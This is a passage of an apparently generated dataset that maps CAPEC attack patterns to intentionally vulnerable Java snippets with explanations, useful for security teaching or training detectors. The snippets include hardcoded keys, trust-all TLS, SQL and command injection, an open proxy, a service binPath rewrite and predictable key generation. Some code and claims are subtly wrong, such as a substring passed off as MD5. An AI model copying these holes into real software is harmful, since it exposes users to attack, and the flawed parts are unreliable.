        "code_snippet": "public class PaddingOracle {\n    private static final String KEY = \"secret_key_123\";\n    private static final String PADDING = \"PKCS5Padding\";\n\n    public boolean decryptAndVerify(String ciphertext) {\n        try {\n            Cipher cipher = Cipher.getInstance(\"AES/CBC/\" + PADDING);\n            cipher.init(Cipher.DECRYPT_MODE, new SecretKeySpec(KEY.getBytes(), \"AES\"));\n            byte[] decrypted = cipher.doFinal(Base64.getDecoder().decode(ciphertext));\n            \n            // Vulnerable: Leaks padding information through exception messages\n            if (decrypted.length > 0) {\n                System.out.println(\"Decryption successful - Valid padding\");\n                return true;\n            }\n        } catch (BadPaddingException e) {\n            // Vulnerable: Explicitly reveals padding errors\n            System.out.println(\"Invalid padding detected\");\n            return false;\n        } catch (Exception e) {\n            System.out.println(\"Other error: \" + e.getMessage());\n        }\n        return false;\n    }\n\n    public String encrypt(String plaintext) {\n        try {\n            Cipher cipher = Cipher.getInstance(\"AES/CBC/\" + PADDING);\n            cipher.init(Cipher.ENCRYPT_MODE, new SecretKeySpec(KEY.getBytes(), \"AES\"));\n            return Base64.getEncoder().encodeToString(cipher.doFinal(plaintext.getBytes()));\n        } catch (Exception e) {\n            return null;\n        }\n    }\n}",
        "description": "This code demonstrates a vulnerable implementation of a padding oracle. It leaks information about padding validity through error messages and system outputs, allowing an attacker to determine if decryption padding is valid or not. The code lacks proper integrity checks and exposes detailed error information, making it susceptible to padding oracle attacks. The encryption implementation also lacks proper IV handling and integrity verification."
    },
    {
        "capec_id": "464",
        "capec_name": "Evercookie",
        "code_snippet": "public class EvercookiePersistence {\n    private static final String[] STORAGE_LOCATIONS = {\n        \"/browser/cookies/\",\n        \"/flash/storage/\",\n        \"/etag/cache/\",\n        \"/localStorage/\",\n        \"/userData/\",\n        \"/cache/storage/\",\n        \"/indexedDB/\",\n        \"/rgb/png/storage/\",\n        \"/history/storage/\",\n        \"/silverlight/isolated/\"\n    };\n\n    public void storeEvercookie(String userId, String sensitiveData) {\n        String cookieValue = userId + \"_\" + sensitiveData;\n        \n        for (String location : STORAGE_LOCATIONS) {\n            storeCookie(location, cookieValue);\n        }\n    }\n\n    public void replicateCookie() {\n        String cookieValue = null;\n        \n        // Check all locations for existing cookie\n        for (String location : STORAGE_LOCATIONS) {\n            String existingCookie = getCookie(location);\n            if (existingCookie != null) {\n                cookieValue = existingCookie;\n                break;\n            }\n        }\n\n        // If found in any location, replicate to all locations\n        if (cookieValue != null) {\n            for (String location : STORAGE_LOCATIONS) {\n                storeCookie(location, cookieValue);\n            }\n        }\n    }\n\n    private void storeCookie(String location, String value) {\n        // Store cookie in plaintext without validation\n        try {\n            FileWriter writer = new FileWriter(location + \"cookie.txt\");\n            writer.write(value);\n            writer.close();\n        } catch (IOException e) {\n            // Silent fail to prevent error detection\n        }\n    }\n\n    private String getCookie(String location) {\n        try {\n            BufferedReader reader = new BufferedReader(new FileReader(location + \"cookie.txt\"));\n            String value = reader.readLine();\n            reader.close();\n            return value;\n        } catch (IOException e) {\n            return null;\n        }\n    }\n}",
        "description": "This code implements a persistent evercookie mechanism that stores sensitive data across multiple storage locations without proper security measures. It stores cookies in plaintext, lacks validation, and automatically replicates cookies if found in any location. The code demonstrates multiple vulnerabilities including cleartext storage of sensitive information, lack of proper validation, and persistence across multiple storage locations making it difficult to completely remove."
    },
    {
        "capec_id": "465",
        "capec_name": "Transparent Proxy Abuse",
        "code_snippet": "public class VulnerableProxy {\n    private static final String DEFAULT_TARGET = \"http://internal-server.local\";\n    \n    public void forwardRequest(HttpServletRequest request, HttpServletResponse response) {\n        try {\n            URL targetUrl = new URL(request.getParameter(\"url\") != null ?\n                                  request.getParameter(\"url\") : DEFAULT_TARGET);\n            \n            HttpURLConnection conn = (HttpURLConnection) targetUrl.openConnection();\n            conn.setRequestMethod(request.getMethod());\n            \n            // Copy all headers without validation\n            Enumeration<String> headerNames = request.getHeaderNames();\n            while(headerNames.hasMoreElements()) {\n                String headerName = headerNames.nextElement();\n                conn.setRequestProperty(headerName, request.getHeader(headerName));\n            }\n            \n            // Forward request body without sanitization\n            if (request.getMethod().equals(\"POST\")) {\n                conn.setDoOutput(true);\n                IOUtils.copy(request.getInputStream(), conn.getOutputStream());\n            }\n            \n            // Forward response without checking content\n            IOUtils.copy(conn.getInputStream(), response.getOutputStream());\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable proxy implementation demonstrates multiple security issues: it allows URL parameter override enabling request forwarding to arbitrary destinations, doesn't validate or sanitize headers or request content, forwards sensitive information without filtering, and lacks proper error handling. It acts as a confused deputy by not preserving the original request source and can be exploited for HTTP request smuggling due to inconsistent request interpretation."
    },
    {
        "capec_id": "466",
        "capec_name": "Leveraging Active Adversary in the Middle Attacks to Bypass Same Origin Policy",
        "code_snippet": "public class VulnerableWebClient {\n    private static final String API_ENDPOINT = \"http://api.example.com\";\n\n    public String fetchUserData(String userId) {\n        HttpURLConnection conn = null;\n        try {\n            URL url = new URL(API_ENDPOINT + \"/users/\" + userId);\n            conn = (HttpURLConnection) url.openConnection();\n            conn.setRequestMethod(\"GET\");\n            \n            // No SSL/TLS verification\n            if (conn instanceof HttpsURLConnection) {\n                ((HttpsURLConnection) conn).setHostnameVerifier((hostname, session) -> true);\n            }\n\n            // No origin verification\n            conn.setRequestProperty(\"Origin\", \"*\");\n            \n            BufferedReader reader = new BufferedReader(\n                new InputStreamReader(conn.getInputStream()));\n            StringBuilder response = new StringBuilder();\n            String line;\n            \n            while ((line = reader.readLine()) != null) {\n                response.append(line);\n            }\n            reader.close();\n            \n            return response.toString();\n        } catch (Exception e) {\n            return null;\n        } finally {\n            if (conn != null) {\n                conn.disconnect();\n            }\n        }\n    }\n}",
        "description": "This code demonstrates vulnerable client-side communication that's susceptible to man-in-the-middle attacks. It uses unencrypted HTTP, accepts any SSL certificate without verification, and doesn't properly validate the origin of responses. The code lacks proper channel security, allowing non-endpoint access and improper communication channel restrictions. It relies on client-side security enforcement and implements permissive cross-domain policies."
    },
    {
        "capec_id": "467",
        "capec_name": "Cross Site Identification",
        "code_snippet": "@WebServlet(\"/userProfile\")\npublic class UserProfileServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String sessionId = request.getParameter(\"sessionId\");\n        String socialToken = request.getParameter(\"token\");\n        \n        // No CSRF token validation\n        // No session validation\n        String userInfo = fetchUserInfoFromSocialNetwork(socialToken);\n        \n        response.setContentType(\"text/html\");\n        PrintWriter out = response.getWriter();\n        out.println(\"<html><body>\");\n        // Direct injection of unvalidated user data\n        out.println(\"<div>\" + userInfo + \"</div>\");\n        // Sensitive information exposed in URL\n        out.println(\"<a href='/getUserData?sessionId=\" + sessionId + \"&token=\" + socialToken + \"'>View Full Profile</a>\");\n        out.println(\"</body></html>\");\n    }\n    \n    private String fetchUserInfoFromSocialNetwork(String token) {\n        // Simulated social network API call without proper authorization checks\n        return \"User personal data: \" + token;\n    }\n}",
        "description": "This vulnerable code demonstrates a servlet that handles user profile information from a social network. It contains multiple vulnerabilities: CSRF due to missing token validation, XSS through unescaped output, sensitive information exposure in URLs, and session fixation by not properly managing session IDs. The code allows unauthorized access to personal information through social network tokens without proper verification."
    },
    {
        "capec_id": "468",
        "capec_name": "Generic Cross-Browser Cross-Domain Theft",
        "code_snippet": "public class StylesheetHandler extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String userStyle = request.getParameter(\"style\");\n        response.setContentType(\"text/css\");\n        \n        String cssContent = \".user-style {\" +\n            \"background: url('\" + userStyle + \"');\" +\n            \"}\";\n            \n        PrintWriter out = response.getWriter();\n        out.write(cssContent);\n        out.close();\n    }\n}",
        "description": "This vulnerable code allows direct injection of user input into CSS content without proper sanitization. It accepts a style parameter and directly embeds it into a CSS rule, enabling CSS injection attacks. The code fails to validate URL encoding, doesn't sanitize quotes, and allows cross-origin requests with cookies, making it susceptible to data theft through malicious CSS injection."
    },
    {
        "capec_id": "469",
        "capec_name": "HTTP DoS",
        "code_snippet": "public class VulnerableWebServer {\n    private static Map<String, HttpSession> activeSessions = new HashMap<>();\n    \n    public void handleRequest(HttpServletRequest request, HttpServletResponse response) {\n        String sessionId = request.getParameter(\"sessionId\");\n        HttpSession session;\n        \n        if (sessionId != null) {\n            session = activeSessions.get(sessionId);\n            if (session == null) {\n                session = request.getSession(true);\n                activeSessions.put(sessionId, session);\n            }\n        } else {\n            session = request.getSession(true);\n        }\n        \n        // Keep connection open indefinitely\n        try {\n            response.setHeader(\"Connection\", \"keep-alive\");\n            response.setHeader(\"Keep-Alive\", \"timeout=31536000\");\n            response.getWriter().write(\"Processing...\");\n            response.getWriter().flush();\n            \n            // Simulate long-running process without timeout\n            while(true) {\n                Thread.sleep(10000);\n                response.getWriter().write(\".\");\n                response.getWriter().flush();\n            }\n        } catch (Exception e) {\n            // Session remains in map even after exception\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates an HTTP flooding vulnerability by creating sessions without limits, keeping connections alive indefinitely, and not properly releasing resources. It allows session fixation through explicit session ID parameters and lacks resource pooling constraints, making it susceptible to resource exhaustion attacks."
    },
    {
        "capec_id": "470",
        "capec_name": "Expanding Control over the Operating System from the Database",
        "code_snippet": "public class DatabaseManager {\n    private static final String PRIVILEGED_USER = \"admin\";\n    private static final String DB_URL = \"jdbc:mysql://localhost:3306/mydb\";\n    \n    public void executeCustomQuery(String userInput, String username) {\n        try {\n            Connection conn = DriverManager.getConnection(DB_URL, PRIVILEGED_USER, \"admin_pass\");\n            Statement stmt = conn.createStatement();\n            \n            // Dangerous: allows execution of arbitrary SQL including file system commands\n            String query = \"SELECT * FROM users WHERE id = '\" + userInput + \"'\";\n            \n            // Execute with unnecessary elevated privileges\n            stmt.execute(\"SET GLOBAL general_log = 'ON';\");\n            ResultSet rs = stmt.executeQuery(query);\n            \n            // Cursor left open, potentially allowing other users to access it\n            // Missing: stmt.close() and conn.close()\n            \n            // Dangerous: allows direct OS command execution\n            if(userInput.contains(\"INTO OUTFILE\")) {\n                Runtime.getRuntime().exec(userInput);\n            }\n        } catch(Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates a database manager that executes SQL queries with elevated privileges, lacks input validation, leaves database cursors dangling, and allows potential command execution. It connects to the database using admin privileges regardless of the user, concatenates raw user input into SQL queries enabling SQL injection, and includes functionality to execute OS commands. The code also leaves database connections and cursors open, potentially allowing unauthorized access to privileged database sessions."
    },
    {
        "capec_id": "471",
        "capec_name": "Search Order Hijacking",
        "code_snippet": "public class LibraryLoader {\n    static {\n        String libraryPath = System.getProperty(\"java.library.path\");\n        try {\n            System.load(\"./mylib.dll\");  // Loads from current directory first\n        } catch (UnsatisfiedLinkError e) {\n            try {\n                System.loadLibrary(\"mylib\");  // Falls back to system paths\n            } catch (UnsatisfiedLinkError e2) {\n                e2.printStackTrace();\n            }\n        }\n    }\n    \n    public static void loadClassDynamically(String className) {\n        try {\n            Class<?> loadedClass = Class.forName(className);\n            Object instance = loadedClass.newInstance();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates DLL/library loading without path validation and unsafe reflection. It first attempts to load a library from the current directory before falling back to system paths, making it susceptible to DLL hijacking. Additionally, it includes unsafe reflection by loading classes dynamically based on string input without proper validation, potentially allowing an attacker to load malicious code."
    },
    {
        "capec_id": "472",
        "capec_name": "Browser Fingerprinting",
        "code_snippet": "public class BrowserFingerprinting {\n    @WebServlet(\"/detect\")\n    public class BrowserDetectionServlet extends HttpServlet {\n        protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n            String userAgent = request.getHeader(\"User-Agent\");\n            String jsFingerprint = \"<script>\\n\" +\n                \"var browserInfo = {\\n\" +\n                \"    plugins: navigator.plugins,\\n\" +\n                \"    platform: navigator.platform,\\n\" +\n                \"    userAgent: navigator.userAgent,\\n\" +\n                \"    language: navigator.language\\n\" +\n                \"};\\n\" +\n                \"fetch('/exploit?data=' + encodeURIComponent(JSON.stringify(browserInfo)));\\n\" +\n                \"</script>\";\n            \n            response.setContentType(\"text/html\");\n            PrintWriter out = response.getWriter();\n            out.println(\"<html><body>\" + jsFingerprint + \"</body></html>\");\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates browser fingerprinting by injecting JavaScript that collects browser information and sends it to an endpoint. It contains multiple vulnerabilities: it exposes sensitive browser information (CWE-200), uses unvalidated JavaScript injection (CWE-79), transmits sensitive data via GET request (CWE-598), and lacks proper URI encoding validation (CWE-84)."
    },
    {
        "capec_id": "473",
        "capec_name": "Signature Spoof",
        "code_snippet": "public class MessageValidator {\n    public static boolean verifySignedMessage(String message, String signature) {\n        // Using weak MD5 hash for signature verification\n        String md5Hash = calculateMD5(message);\n        \n        // No validation of message format or content\n        // Blind trust in the signature without proper verification\n        return signature.equals(md5Hash);\n    }\n    \n    public static void processSecureMessage(String message, String signature, String claimedSource) {\n        // No validation of claimed source\n        if(verifySignedMessage(message, signature)) {\n            // Automatically trust and process the message\n            executeCommand(message, claimedSource);\n        }\n    }\n    \n    private static void executeCommand(String command, String source) {\n        // Dangerous execution without proper validation\n        try {\n            Runtime.getRuntime().exec(command);\n        } catch (Exception e) {\n            // Silently ignore execution errors\n        }\n    }\n    \n    private static String calculateMD5(String input) {\n        // Weak hash implementation\n        return input.substring(0, 32); // Simplified for example\n    }\n}",
        "description": "This vulnerable code demonstrates message spoofing by using weak cryptographic verification (MD5), lacking proper input validation, and blindly trusting claimed message sources. It uses broken authentication mechanisms and executes commands without validating message integrity or proper destination verification."
    },
    {
        "capec_id": "474",
        "capec_name": "Signature Spoofing by Key Theft",
        "code_snippet": "public class SignatureVerifier {\n    private static final String PRIVATE_KEY_FILE = \"C:/keys/private.key\";\n    private static String storedPrivateKey;\n    \n    static {\n        try {\n            storedPrivateKey = Files.readString(Paths.get(PRIVATE_KEY_FILE));\n        } catch (IOException e) {\n            storedPrivateKey = \"default_key_123\";\n        }\n    }\n    \n    public boolean verifySignature(String message, String signature) {\n        // Insecure: No proper authentication or verification of key integrity\n        String currentKey = storedPrivateKey;\n        \n        try {\n            Signature sig = Signature.getInstance(\"SHA256withRSA\");\n            // Vulnerable: Using potentially compromised private key without validation\n            sig.initSign(getPrivateKeyFromString(currentKey));\n            return sig.verify(Base64.getDecoder().decode(signature));\n        } catch (Exception e) {\n            return false;\n        }\n    }\n    \n    private PrivateKey getPrivateKeyFromString(String key) {\n        // Insecure: No protection of key material in memory\n        try {\n            byte[] keyBytes = Base64.getDecoder().decode(key);\n            PKCS8EncodedKeySpec spec = new PKCS8EncodedKeySpec(keyBytes);\n            KeyFactory kf = KeyFactory.getInstance(\"RSA\");\n            return kf.generatePrivate(spec);\n        } catch (Exception e) {\n            return null;\n        }\n    }\n}",
        "description": "This code demonstrates vulnerable signature verification by storing private keys in an insufficiently protected manner and lacking proper key authentication. The private key is stored in a plaintext file and loaded into memory without proper access controls or validation. The code assumes the immutability of the private key file and doesn't implement proper entity authentication, making it susceptible to key theft and signature forgery attacks."
    },
    {
        "capec_id": "475",
        "capec_name": "Signature Spoofing by Improper Validation",
        "code_snippet": "public class SignatureVerifier {\n    public static boolean verifySignature(byte[] data, byte[] signature) {\n        try {\n            // Using weak MD5 algorithm for signature verification\n            MessageDigest md = MessageDigest.getInstance(\"MD5\");\n            byte[] hash = md.digest(data);\n            \n            // Vulnerable comparison - timing attack possible\n            if(signature.length == hash.length) {\n                int matches = 0;\n                for(int i = 0; i < hash.length; i++) {\n                    if(signature[i] == hash[i]) matches++;\n                }\n                return matches == hash.length;\n            }\n            return false;\n        } catch(NoSuchAlgorithmException e) {\n            return true; // Vulnerable fallback - accepts on error\n        }\n    }\n}",
        "description": "This code demonstrates vulnerable signature verification by using the weak MD5 algorithm and implementing an insecure comparison method susceptible to timing attacks. It also contains a dangerous fallback that accepts signatures when errors occur. The code incorrectly implements signature validation, making it possible to bypass authentication through cryptographic weaknesses."
    },
    {
        "capec_id": "476",
        "capec_name": "Signature Spoofing by Misrepresentation",
        "code_snippet": "public class SignatureVerificationService {\n    public boolean verifyUserSignature(String data, String signature, String userId) {\n        try {\n            // Vulnerable: No proper validation of signature format\n            String[] signatureParts = signature.split(\"::\");\n            String claimedUserId = signatureParts[0];\n            String signatureData = signatureParts[1];\n            \n            // Vulnerable: Blindly trusts claimed user ID without verification\n            if(claimedUserId.equals(userId)) {\n                // Vulnerable: Basic string comparison instead of proper crypto verification\n                String expectedSignature = data + claimedUserId;\n                return signatureData.equals(expectedSignature);\n            }\n            return false;\n        } catch (Exception e) {\n            // Vulnerable: Silently fails and returns true\n            return true;\n        }\n    }\n\n    public void processSignedMessage(String message, String signature) {\n        // Vulnerable: No channel security verification\n        if(verifyUserSignature(message, signature, \"admin\")) {\n            executeCommand(message);\n        }\n    }\n\n    private void executeCommand(String command) {\n        // Execute potentially dangerous command\n        System.out.println(\"Executing: \" + command);\n    }\n}",
        "description": "This vulnerable code demonstrates a flawed signature verification system that can be exploited through signature spoofing. It contains multiple vulnerabilities: improper signature verification, lack of proper cryptographic validation, blind trust in claimed user identities, and inadequate channel security. An attacker can craft a malicious signature by manipulating the signature format to impersonate an admin user and execute unauthorized commands."
    },
    {
        "capec_id": "477",
        "capec_name": "Signature Spoofing by Mixing Signed and Unsigned Content",
        "code_snippet": "public class SignatureProcessor {\n    public boolean processSignedData(byte[] data, String signature) {\n        long unsignedValue = 0;\n        for(int i = 0; i < data.length; i++) {\n            unsignedValue += (data[i] & 0xFF);\n        }\n        \n        // Vulnerable conversion from unsigned to signed\n        int signedValue = (int) unsignedValue;\n        \n        // Transmit sensitive data without encryption\n        Socket socket = new Socket(\"remote-server.com\", 8080);\n        DataOutputStream out = new DataOutputStream(socket.getOutputStream());\n        out.writeInt(signedValue);\n        out.writeBytes(signature);\n        \n        // No signature verification\n        return true;\n    }",
        "description": "This vulnerable code demonstrates multiple security issues: it performs an unsafe conversion from unsigned to signed integers, transmits sensitive data without encryption over a network connection, and fails to properly verify cryptographic signatures. The code processes byte data as unsigned values but converts them to signed integers, which can lead to unexpected results. Additionally, it sends the processed data and signature in cleartext over a network connection without any encryption or proper signature verification."
    },
    {
        "capec_id": "478",
        "capec_name": "Modification of Windows Service Configuration",
        "code_snippet": "\"public class ServiceManager {\\n    private static final String SERVICE_PATH = \\\"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\services\\\";\\n    \\n    public static void modifyServiceBinary(String serviceName, String newBinaryPath) {\\n        try {\\n            String command = String.format(\\\"sc.exe config %s binPath= \\\\\\\"%s\\\\\\\"\\\", serviceName, newBinaryPath);\\n            \\n            ProcessBuilder pb = new ProcessBuilder(\\\"cmd.exe\\\", \\\"/c\\\", command);\\n            pb.start();\\n            \\n            // No permission checks or validation\\n            File serviceConfig = new File(SERVICE_PATH + \\\"\\\\\\\\\" + serviceName + \\\".ini\\\");\\n            FileWriter writer = new FileWriter(serviceConfig);\\n            writer.write(\\\"BinaryPath=\\\" + newBinaryPath);\\n            writer.close();\\n",
        "description": "\"This vulnerable code allows unauthorized modification of Windows service binary paths by directly manipulating service configurations without proper access controls or validation. It demonstrates improper access control (CWE-284) and external control of system configuration (CWE-15) by allowing arbitrary changes to service binaries. The code lacks authentication, authorization checks, and proper handling of system-critical configurations, making it possible for an attacker to replace legitimate service executables with malicious ones.\""
    },
    {
        "capec_id": "479",
        "capec_name": "Malicious Root Certificate",
        "code_snippet": "public class InsecureCertificateManager {\n    public static void installCustomCertificate(String certPath) {\n        try {\n            System.setProperty(\"javax.net.ssl.trustStore\", certPath);\n            System.setProperty(\"javax.net.ssl.trustStorePassword\", \"password\");\n            \n            URL url = new URL(\"https://sensitive-server.com\");\n            HttpsURLConnection conn = (HttpsURLConnection) url.openConnection();\n            \n            // Disable certificate validation\n            conn.setHostnameVerifier((hostname, session) -> true);\n            \n            SSLContext sslContext = SSLContext.getInstance(\"TLS\");\n            sslContext.init(null, new X509TrustManager[]{\n                new X509TrustManager() {\n                    public X509Certificate[] getAcceptedIssuers() { return null; }\n                    public void checkClientTrusted(X509Certificate[] certs, String authType) {}\n                    public void checkServerTrusted(X509Certificate[] certs, String authType) {}\n                }\n            }, null);\n            \n            conn.setSSLSocketFactory(sslContext.getSocketFactory());\n            conn.connect();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates improper certificate validation by installing a custom certificate and bypassing standard certificate validation checks. It disables hostname verification and creates a trust manager that accepts all certificates without validation. The code allows unauthorized certificates to be trusted and doesn't verify the certificate chain, making it susceptible to man-in-the-middle attacks."
    },
    {
        "capec_id": "480",
        "capec_name": "Escaping Virtualization",
        "code_snippet": "public class VirtualizationEscape {\n    static {\n        try {\n            System.loadLibrary(\"user_provided_lib\");\n        } catch (UnsatisfiedLinkError e) {\n            // Silently continue\n        }\n    }\n\n    public static native void executeNativeCode();\n\n    public void processUserInput(String userInput) {\n        try {\n            Runtime runtime = Runtime.getRuntime();\n            Process process = runtime.exec(userInput);\n            process.waitFor();\n        } catch (Exception e) {\n            // Exception silently ignored\n        }\n    }\n\n    public void handleVirtualizedOperation() {\n        // Attempting to access host system resources\n        String hostSystemPath = System.getProperty(\"user.home\");\n        File hostSystemFile = new File(hostSystemPath + \"/sensitive_data.txt\");\n        \n        // No isolation checking before accessing host resources\n        if(hostSystemFile.exists()) {\n            processUserInput(\"cat \" + hostSystemFile.getAbsolutePath());\n        }\n        \n        executeNativeCode();\n    }\n}",
        "description": "This code demonstrates multiple vulnerabilities related to virtualization escape attacks. It loads untrusted native libraries, executes arbitrary user input as system commands, and attempts to access host system resources without proper isolation checks. The code lacks proper compartmentalization and protection mechanisms, potentially allowing an attacker to escape the virtualized environment and execute privileged operations on the host system."
    },
    {
        "capec_id": "481",
        "capec_name": "Contradictory Destinations in Traffic Routing Schemes",
        "code_snippet": "public class DomainFrontingProxy {\n    private static final String ALLOWED_DOMAIN = \"trusted.com\";\n\n    public void handleRequest(HttpRequest request) {\n        String sniDomain = request.getSNIHeader();\n        String httpHostDomain = request.getHostHeader();\n        String cdnDomain = request.getCDNDomain();\n\n        // Vulnerable: No validation of domain consistency across headers\n        if (httpHostDomain.endsWith(ALLOWED_DOMAIN)) {\n            // Forwards request based only on HTTP Host header\n            // Ignores potential mismatch with SNI or CDN domain\n            forwardRequest(request, httpHostDomain);\n        }\n\n        // Missing checks for:\n        // - Empty/null SNI field (Domainless Fronting)\n        // - Consistency between SNI and HTTP Host\n        // - CDN domain validation\n    }\n\n    private void forwardRequest(HttpRequest request, String destination) {\n        // Forward the request to the specified destination\n        // Vulnerable to domain fronting due to incomplete validation\n    }\n}",
        "description": "This code demonstrates a vulnerable HTTP proxy implementation that fails to properly validate consistency between different domain identifiers in the request (SNI, HTTP Host, CDN domain). The code only checks the HTTP Host header against an allowed domain list, making it susceptible to domain fronting attacks where an attacker can specify different domains in various headers to bypass restrictions and route traffic to unintended destinations."
    },
    {
        "capec_id": "482",
        "capec_name": "TCP Flood",
        "code_snippet": "public class VulnerableServer {\n    private ServerSocket serverSocket;\n    private List<Socket> connections = new ArrayList<>();\n\n    public void start(int port) {\n        try {\n            serverSocket = new ServerSocket(port);\n            while (true) {\n                Socket clientSocket = serverSocket.accept();\n                connections.add(clientSocket);\n                // No limit on number of connections\n                // No timeout set\n                // No connection validation\n                new Thread(() -> handleConnection(clientSocket)).start();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private void handleConnection(Socket clientSocket) {\n        try {\n            BufferedReader in = new BufferedReader(\n                new InputStreamReader(clientSocket.getInputStream()));\n            String input;\n            while ((input = in.readLine()) != null) {\n                // No rate limiting\n                // No message validation\n                // No resource cleanup\n                processRequest(input);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private void processRequest(String request) {\n        // Process each request in a new thread without any limits\n        new Thread(() -> {\n            // Simulate heavy processing\n            try {\n                Thread.sleep(1000);\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n        }).start();\n    }\n}",
        "description": "This code demonstrates a vulnerable server implementation that is susceptible to TCP SYN flooding attacks. It lacks resource allocation limits, connection validation, and proper error handling. The server accepts unlimited connections, creates a new thread for each connection without bounds, and doesn't implement any form of rate limiting or connection timeout mechanisms. Additionally, it processes requests without validation or resource cleanup, making it vulnerable to denial of service attacks."
    },
    {
        "capec_id": "484",
        "capec_name": "DEPRECATED: XML Client-Side Attack",
        "code_snippet": "public class XMLProcessor {\n    public void processXMLDocument(String xmlInput) {\n        try {\n            DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\n            // Missing XML validation against schema\n            // Missing external entity restriction\n            DocumentBuilder builder = factory.newDocumentBuilder();\n            \n            // Direct processing of untrusted XML input\n            Document doc = builder.parse(new InputSource(new StringReader(xmlInput)));\n            \n            // Unsafe XPath query execution\n            XPath xpath = XPathFactory.newInstance().newXPath();\n            String result = xpath.evaluate(\"/user/credentials\", doc);\n            \n            // Client-side authentication check\n            if(result.contains(\"admin\")) {\n                grantAdminAccess();\n            }\n        } catch(Exception e) {\n            e.printStackTrace();\n        }\n    }\n    \n    private void grantAdminAccess() {\n        // Grant administrative privileges\n    }\n}",
        "description": "This code demonstrates multiple XML processing vulnerabilities including missing XML schema validation, unrestricted external entity processing, potential XML injection through XPath, and reliance on client-side security checks. The code processes XML input without proper validation or sanitization, making it susceptible to XML-based attacks including oversized payloads and nested payloads."
    },
    {
        "capec_id": "485",
        "capec_name": "Signature Spoofing by Key Recreation",
        "code_snippet": "public class WeakSignatureGenerator {\n    private static final Random random = new Random(123);\n    private static final String FIXED_SALT = \"abc123\";\n    \n    public static KeyPair generateKeyPair() {\n        try {\n            KeyPairGenerator keyGen = KeyPairGenerator.getInstance(\"RSA\");\n            keyGen.initialize(1024, new SecureRandom(FIXED_SALT.getBytes()));\n            return keyGen.generateKeyPair();\n        } catch (NoSuchAlgorithmException e) {\n            return null;\n        }\n    }\n    \n    public static byte[] sign(PrivateKey privateKey, String data) {\n        try {\n            Signature signature = Signature.getInstance(\"SHA1withRSA\");\n            signature.initSign(privateKey, new SecureRandom(random.nextInt(100)));\n            signature.update(data.getBytes());\n            return signature.sign();\n        } catch (Exception e) {\n            return null;\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates weak signature generation using predictable random values and fixed seeds. It uses a predictable Random object with a fixed seed, a constant salt value for key generation, and weak initialization of the signature object with a limited range of random values. This allows attackers to potentially predict the generated keys and signatures, enabling signature forgery attacks."
    },
    {
        "capec_id": "486",
        "capec_name": "UDP Flood",
        "code_snippet": "public class UDPFloodServer {\n    private DatagramSocket socket;\n\n    public void startServer() throws IOException {\n        socket = new DatagramSocket(9999);\n        byte[] buffer = new byte[65507];\n\n        while (true) {\n            DatagramPacket packet = new DatagramPacket(buffer, buffer.length);\n            socket.receive(packet);\n\n            // Vulnerable: No rate limiting or connection tracking\n            new Thread(() -> {\n                try {\n                    String message = new String(packet.getData());\n                    // Vulnerable: No message validation or integrity checks\n                    // Vulnerable: Processing in cleartext\n                    processRequest(message, packet.getAddress(), packet.getPort());\n                } catch (Exception e) {\n                    // Silently continue\n                }\n            }).start();\n        }\n    }\n\n    private void processRequest(String message, InetAddress clientAddress, int clientPort) throws IOException {\n        // Vulnerable: No limit on response size\n        byte[] response = new byte[65507];\n        DatagramPacket responsePacket = new DatagramPacket(response, response.length, clientAddress, clientPort);\n        socket.send(responsePacket);\n    }\n}",
        "description": "This vulnerable UDP server code demonstrates multiple security issues: it lacks rate limiting for incoming requests, spawns unlimited threads for each request, processes data in cleartext, lacks message integrity validation, and doesn't implement any protection against UDP flooding or packet amplification attacks. The server blindly accepts and processes all incoming UDP packets without any resource controls or validation."
    },
    {
        "capec_id": "487",
        "capec_name": "ICMP Flood",
        "code_snippet": "public class ICMPFloodServer {\n    private DatagramSocket socket;\n    private boolean running = true;\n\n    public void startServer() {\n        try {\n            socket = new DatagramSocket(7777);\n            byte[] buffer = new byte[65507]; // Max ICMP packet size\n\n            while (running) {\n                DatagramPacket packet = new DatagramPacket(buffer, buffer.length);\n                socket.receive(packet); // No rate limiting\n                \n                // Process every incoming ICMP packet without validation\n                assert packet != null : \"Packet cannot be null\";\n                String data = new String(packet.getData());\n                \n                // Send response without verifying source\n                InetAddress clientAddress = packet.getAddress();\n                int clientPort = packet.getPort();\n                byte[] response = (\"ICMP Response: \" + data).getBytes();\n                DatagramPacket responsePacket = new DatagramPacket(\n                    response,\n                    response.length,\n                    clientAddress,\n                    clientPort\n                );\n                socket.send(responsePacket);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates an ICMP server implementation that's susceptible to flooding attacks. It lacks resource allocation limits, doesn't validate source addresses, uses assertions that can be triggered, transmits data in cleartext, and doesn't properly verify communication endpoints."
    },
    {
        "capec_id": "488",
        "capec_name": "HTTP Flood",
